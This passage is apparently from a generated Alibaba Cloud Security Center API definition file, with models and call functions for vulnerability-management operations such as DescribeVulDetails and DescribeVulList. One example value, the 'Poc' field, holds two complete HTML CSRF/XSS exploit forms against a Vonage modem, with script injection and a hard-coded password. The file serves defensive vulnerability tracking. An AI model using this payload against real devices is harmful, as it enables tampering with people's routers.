async function describeVpcListWithOptions(runtime: Util.RuntimeOptions): DescribeVpcListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcList(): DescribeVpcListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcListWithOptions(runtime);
}

model DescribeVulCheckTaskStatusDetailRequest {
  taskIds?: [ string ](name='TaskIds'),
  types?: [ string ](name='Types'),
  uuid?: string(name='Uuid', example='5d55af3c-35f3-4d4d-8ccc-8c5443b0****'),
}

model DescribeVulCheckTaskStatusDetailResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  taskStatuses?: [ 
    {
      taskId?: string(name='TaskId', example='16190385'),
      taskStatusList?: [ 
        {
          code?: string(name='Code', example='push_command_failed'),
          status?: string(name='Status', example='4'),
          type?: string(name='Type', example='cve'),
        }
      ](name='TaskStatusList'),
    }
  ](name='TaskStatuses'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeVulCheckTaskStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulCheckTaskStatusDetailResponseBody(name='body'),
}

async function describeVulCheckTaskStatusDetailWithOptions(request: DescribeVulCheckTaskStatusDetailRequest, runtime: Util.RuntimeOptions): DescribeVulCheckTaskStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulCheckTaskStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulCheckTaskStatusDetail(request: DescribeVulCheckTaskStatusDetailRequest): DescribeVulCheckTaskStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulCheckTaskStatusDetailWithOptions(request, runtime);
}

model DescribeVulConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.110.XX.XX'),
  type?: string(name='Type', description='The type of configuration. By default, all types of configurations are queried. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability
*   **scanMode**: displays easily exploitable vulnerability
*   **imageVulClean**: vulnerability retention duration
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities', example='cve'),
}

model DescribeVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='The configuartion of vulnerability scan.

> 

Valid values of this parameter if **cve**, **sys**, **cms**, **app**, **emg**, or **yum** is returned for the Type parameter:

*   **on**: enabled
*   **off**: disabled

> 

Valid values of this parameter if **scanMode** is returned for the Type parameter:

*   **real**: displays easily exploitable vulnerability
*   **all**: displays all vulnerabilities

> 

If **imageVulClean** is returned for the Type parameter, the value of this parameter indicates the vulnerability retention duration.', example='90'),
      overAllConfig?: string(name='OverAllConfig', description='The status of vulnerability management. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of configuration. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability
*   **scanMode**: displays easily exploitable vulnerability
*   **imageVulClean**: vulnerability retention duration
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations of vulnerability management.'),
  totalCount?: int32(name='TotalCount', description='The total number of configurations.', example='10'),
}

model DescribeVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulConfigResponseBody(name='body'),
}

async function describeVulConfigWithOptions(request: DescribeVulConfigRequest, runtime: Util.RuntimeOptions): DescribeVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulConfig(request: DescribeVulConfigRequest): DescribeVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulConfigWithOptions(request, runtime);
}

model DescribeVulDetailsRequest {
  aliasName?: string(name='AliasName', description='The name in the **vulnerability introduction**.', example='RHSA-2019:3197-Important: sudo security update'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='sca'),
}

model DescribeVulDetailsResponseBody = {
  cves?: [ 
    {
      classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
      classifys?: [ 
        {
          classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
          demoVideoUrl?: string(name='DemoVideoUrl', description='The URL of the demo video for the vulnerability.', example='https://example.com'),
          description?: string(name='Description', description='The description of the vulnerability type.', example='Remote code execution'),
        }
      ](name='Classifys', description='An array that consists of vulnerability types.'),
      cnvdId?: string(name='CnvdId', description='The China National Vulnerability Database (CNVD) ID.', example='CNVD-2019-9167'),
      complexity?: string(name='Complexity', description='The difficulty level of exploiting the vulnerability. Valid values:

*   **LOW**
*   **MEDIUM**
*   **HIGH**', example='LOW'),
      content?: string(name='Content', description='The CVE content.', example='Apache Shiro is a user authentication and authorization framework for a wide range of rights management applications.↵Recently, Apache Shiro released version 1.7.0, which fixes the Apache Shiro authentication bypass vulnerability (CVE-2020-17510).↵Attackers can bypass Shiro\\"s authentication using malicious requests containing payloads.↵↵Related bugs:↵CVE-2020-17510 Shiro < 1.7.0 Validation Bypass Vulnerability↵CVE-2020-13933 Shiro < 1.6.0 Validation Bypass Vulnerability↵CVE-2020-11989 Shiro < 1.5.3 Validation Bypass Vulnerability↵CVE-2020-1957 Shiro < 1.5.2 Validation Bypass Vulnerability↵CVE-2016-6802 Shiro < 1.3.2 Validation Bypass Vulnerability
Check whether the fastjson version currently running on the system is in the affected version and whether safeMode is configured to disable autoType. If it is in the affected version and safeMode is not configured to disable autoType, the vulnerability is considered to exist.'),
      cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID.', example='CVE-2019-9167'),
      cvssScore?: string(name='CvssScore', description='The Common Vulnerability Scoring System (CVSS) score of the vulnerability in the Alibaba Cloud vulnerability library.', example='10.0'),
      cvssVector?: string(name='CvssVector', description='The vector that is used to calculate the CVSS score.', example='AV:N/AC:L/Au:N/C:C/I:C/A:C'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      poc?: string(name='Poc', description='The POC content.', example='NewDomain.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="" / >
<input type="hidden" name="KeywordAction" value="0" />
<input type="hidden" name="NewDomain" value="test\\"><script>alert(1)</script>" />
<input type="hidden" name="x" value="50" />
<input type="hidden" name="y" value="15" />
<input type="hidden" name="DomainAction" value="1" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Exploit" />
</form>
</html>
 
NewKeyword.html
The x and y values will need to be changed accordingly
<html>
<p>Authenticated Stored CSRF/XSS - Vonage Modem</p>
<form method="POST" action="http://192.168.15.1/goform/RgParentalBasic">
<input type="hidden" name="RemoveContentRule" value="0" />
<input type="hidden" name="AddContentRule" value="0" />
<input type="hidden" name="ContentRules" value="0" />
<input type="hidden" name="RuleSelect" value="0" / >
<input type="hidden" name="NewKeyword" value="test\\"><script>alert(1)</script>" / >
<input type="hidden" name="x" value="61" />
<input type="hidden" name="y" value="12" />
<input type="hidden" name="KeywordAction" value="1" />
<input type="hidden" name="NewDomain" value="" />
<input type="hidden" name="DomainAction" value="0" />
<input type="hidden" name="AllowedDomainAction" value="0" />
<input type="hidden" name="ParentalPassword" value="Broadcom" />
<input type="hidden" name="ParentalPasswordReEnter" value="Broadcom" />
<input type="hidden" name="AccessDuration" value="30" />
<input type="submit" title="Enable Service" />
</form>
</html>'),
      pocCreateTime?: long(name='PocCreateTime', description='The timestamp when the proof of concept (POC) was created. Unit: milliseconds.', example='1554189334000'),
      pocDisclosureTime?: long(name='PocDisclosureTime', description='The timestamp when the POC was disclosed. Unit: milliseconds.', example='1554189334000'),
      product?: string(name='Product', description='The service that is affected by the vulnerability.', example='Log4j2'),
      reference?: string(name='Reference', description='The reference of the vulnerability in the Alibaba Cloud vulnerability library. The value is a URL.', example='https://example.com'),
      releaseTime?: long(name='ReleaseTime', description='The disclosure time that is displayed for the vulnerability in the Alibaba Cloud vulnerability library. The value is a UNIX timestamp. Unit: milliseconds.', example='1554189334000'),
      solution?: string(name='Solution', description='The fixing suggestions of the vulnerability.', example='<p>At present, Chanjet has urgently released a vulnerability patch to fix the vulnerability. CNVD recommends affected units and users to upgrade to the latest version immediately:</p>↵<p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>↵<p>At the same time, organizations and users affected by the vulnerability are requested to immediately follow the steps below to conduct self-inspection and repair work:</p>↵<ol>↵<li><p>User self-check steps:↵<br  />Check whether website/bin/load.aspx.cdcab7d2.compiled, website/bin/App_Web_load.aspx.cdcab7d2.dll, and tplus/Load.aspx files exist locally. If they exist, it means that they have been poisoned, and you must reinstall the system and install the product. patch.</p>↵</li>↵<li><p>Non-poisoned users please:↵<br  />1) Update the latest product patch.↵<br  />2) Install anti-virus software and update the virus database in time.↵<br  />3) Upgrade the lower version of IIS and Nginx to IIS10.0 and Windows 2016.↵<br  />4) Local installation customers need to confirm whether the backup file is complete as soon as possible, and do off-site backup. Customers on the cloud should enable the mirroring function in time.↵<br  />5) Users who fail to update the patch in time can contact Chanjet technical support and take temporary preventive measures such as deleting files.</p>↵</li>↵<li><p>Poisoned users please:↵<br  />1) Check whether the server has taken regular snapshots or backups. If so, you can restore data through snapshots or backups.↵<br  />2) Contact Chanjet technical support to confirm whether it has the conditions and operation methods to restore data from backup files.</p>↵</li>↵</ol>↵<p>If you have any technical problems, please contact Chanjet technical support: 4006600566-9</p>'),
      summary?: string(name='Summary', description='The introduction to the vulnerability.', example='Chanjet T-Plus is an Internet business management software. There is an unauthorized access vulnerability in one of its interfaces disclosed on the Internet. Attackers can construct malicious requests to upload malicious files to execute arbitrary code and control the server.'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      title?: string(name='Title', description='The title of the vulnerability announcement.', example='Chanjet T-Plus SetupAccount/Upload. Aspx file upload vulnerability(CNVD-2022-60632)'),
      vendor?: string(name='Vendor', description='The vendor that disclosed the vulnerability.', example='Apache'),
      vulLevel?: string(name='VulLevel', description='The severity of the vulnerability. Valid values:

*   **serious**
*   **high**
*   **medium**
*   **low**', example='serious'),
    }
  ](name='Cves', description='An array that consists of the details about the vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EDA40EA3-6265-5900-AD99-C83E4F109CA8'),
}

model DescribeVulDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulDetailsResponseBody(name='body'),
}

async function describeVulDetailsWithOptions(request: DescribeVulDetailsRequest, runtime: Util.RuntimeOptions): DescribeVulDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulDetails(request: DescribeVulDetailsRequest): DescribeVulDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulDetailsWithOptions(request, runtime);
}

model DescribeVulExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the vulnerability export task.', example='14356'),
}

model DescribeVulExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

- **init**: The task is being initialized.
- **exporting**: The task is in progress.
- **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the vulnerability export task.', example='14356'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **success*, which indicates that the export task is completed.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the asset export task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BXXX-AFA1A032756C'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the Excel file.', example='10'),
}

model DescribeVulExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulExportInfoResponseBody(name='body'),
}

async function describeVulExportInfoWithOptions(request: DescribeVulExportInfoRequest, runtime: Util.RuntimeOptions): DescribeVulExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulExportInfo(request: DescribeVulExportInfoRequest): DescribeVulExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulExportInfoWithOptions(request, runtime);
}

model DescribeVulFixStatisticsResponseBody = {
  fixStat?: [ 
    {
      fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='10'),
      fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='22'),
      fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='17'),
      needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='8'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='cve'),
    }
  ](name='FixStat', description='An array that consists of the statistics of vulnerability fixes by vulnerability type.'),
  fixTotal?: {
    fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='15'),
    fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='47'),
    fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='22'),
    needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='62'),
  }(name='FixTotal', description='The total statistics of vulnerability fixes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeVulFixStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulFixStatisticsResponseBody(name='body'),
}

async function describeVulFixStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeVulFixStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVulFixStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulFixStatistics(): DescribeVulFixStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulFixStatisticsWithOptions(runtime);
}

model DescribeVulListRequest {
  aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
  attachTypes?: string(name='AttachTypes', description='The additional type of the vulnerability. You can specify this parameter when you query application vulnerabilities. Set the value to **sca**. If you set **Type** to **app**, you must specify this parameter.

>  If you set this parameter to **sca**, application vulnerabilities and the vulnerabilities that are detected based on software component analysis are queried. If you do not specify this parameter, only application vulnerabilities are queried.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is fixed. Valid values:

*   **y**: yes
*   **n**: no', example='n'),
  groupId?: string(name='GroupId', description='The ID of the asset group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9207613'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The alias of the vulnerability.', example='oval:com.redhat.rhsa:def:20172836'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset.', example='1.2.XX.XX'),
  type?: string(name='Type', description='The type of the vulnerabilities. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability that is detected by using web scanner
*   **emg**: urgent vulnerability
*   **sca**: application vulnerability that is detected by using software component analysis', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to query the vulnerabilities. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The IDs of the virtual private clouds (VPCs) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='ins-133****,ins-5414****'),
}

model DescribeVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2F26AB2A-1075-488F-8472-40E5DB486ACC'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerabilities returned.', example='2'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
      authVersion?: string(name='AuthVersion', description='The edition of Security Center that is authorized to scan the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to scan the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      extendContentJson?: {
        absolutePath?: string(name='AbsolutePath', description='The package path of the software that has the vulnerability.', example='/roo/www/web'),
        aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
        description?: string(name='Description', description='The description of the vulnerability.', example='kernel version:5.10.84-10.2.al8.x86_64'),
        ip?: string(name='Ip', description='The public IP address of the asset that is associated with the vulnerability.', example='1.2.XX.XX'),
        lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
        necessity?: {
          assetsFactor?: string(name='Assets_factor', description='The asset importance score. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='1'),
          cvssFactor?: string(name='Cvss_factor', description='The Common Vulnerability Scoring System (CVSS) score.', example='7.8'),
          enviromentFactor?: string(name='Enviroment_factor', description='The environment score.', example='1.0'),
          isCalc?: string(name='Is_calc', description='Indicates whether the score of urgency to fix a vulnerability is calculated. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
          status?: string(name='Status', description='The status of the score of urgency to fix a vulnerability. Valid values:

*   **none**: No score is generated.
*   **pending**: The score is pending calculation.
*   **normal**: The calculation is normal.', example='normal'),
          timeFactor?: string(name='Time_factor', description='The time score.', example='1.0'),
          totalScore?: string(name='Total_score', description='The score of urgency to fix a vulnerability.

The following list describes scores and related fixing suggestions:

*   If the score is from **13.5 to 15**, the vulnerability is a high-risk vulnerability. You must fix the vulnerability at the earliest opportunity.
*   If the score is **greater than or equal to 7 but less than 13.5**, the vulnerability is a medium-risk vulnerability. You can fix the vulnerability at your convenience.
*   If the score is **less than 7**, the vulnerability is a low-risk vulnerability. You can ignore the vulnerability.', example='7.8'),
        }(name='Necessity', description='Indicates whether the vulnerability needs to be fixed.'),
        os?: string(name='Os', description='The name of the operating system for your asset.', example='centos'),
        osRelease?: string(name='OsRelease', description='The release of the operating system.', example='7'),
        primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='111'),
        rpmEntityList?: [ 
          {
            containerName?: string(name='ContainerName', description='The name of the container.', example='k8s_67895c4_xxx'),
            fullVersion?: string(name='FullVersion', description='The complete version number.', example='3.10.0-693.2.2.el7'),
            imageName?: string(name='ImageName', description='The name of the image.', example='registry_387ytb_xxx'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rule that is used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the RPM package.', example='python-perf'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            pid?: string(name='Pid', description='The process ID.', example='8664'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='*** update python-perf'),
            version?: string(name='Version', description='The package version number of the software that has the vulnerability.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='An array that consists of the information about RPM Package Manager (RPM) packages.'),
        status?: string(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **2**: fix failed
*   3: rollback failed
*   **4**: being fixed
*   **5**: being rolled back
*   **6**: being verified
*   **7**: fixed
*   **8**: fixed and to be restarted
*   **9**: rolled back
*   **10**: ignored
*   **11**: rolled back and to be restarted
*   **12**: not found
*   **20**: expired', example='1'),
        tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
        cveList?: [ string ](name='cveList', description='The CVE list.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the vulnerability was first detected. Unit: milliseconds.', example='1554189334000'),
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp18t***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170574'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent on the asset is online. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      osName?: string(name='OsName', description='The name of the operating system for your asset.', example='CentOS 7.2 64-bit'),
      osVersion?: string(name='OsVersion', description='The name of the operating system for your asset.', example='linux'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='101162078'),
      regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repairTs?: long(name='RepairTs', description='The timestamp when the vulnerability was fixed. Unit: milliseconds.', example='1541207563000'),
      resultCode?: string(name='ResultCode', description='The code that indicates the vulnerability fixing result.', example='0'),
      resultMessage?: string(name='ResultMessage', description='The message that indicates the vulnerability fixing result.', example='timeout'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **2**: fix failed
*   **3**: rollback failed
*   **4**: being fixed
*   **5**: being rolled back
*   **6**: being verified
*   **7**: fixed
*   **8**: fixed and to be restarted
*   **9**: rolled back
*   **10**: ignored
*   **11**: rolled back and to be restarted
*   **12**: not found
*   **20**: expired', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability', example='cve'),
      uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='04c56617-23fc-43a5-ab9b-****'),
    }
  ](name='VulRecords', description='An array that consists of the vulnerabilities.'),
}

model DescribeVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListResponseBody(name='body'),
}

async function describeVulListWithOptions(request: DescribeVulListRequest, runtime: Util.RuntimeOptions): DescribeVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulList(request: DescribeVulListRequest): DescribeVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListWithOptions(request, runtime);
}

model DescribeVulListPageRequest {
  currentPage?: int32(name='CurrentPage'),
  cveId?: string(name='CveId'),
  pageSize?: int32(name='PageSize'),
  vulNameLike?: string(name='VulNameLike'),
}

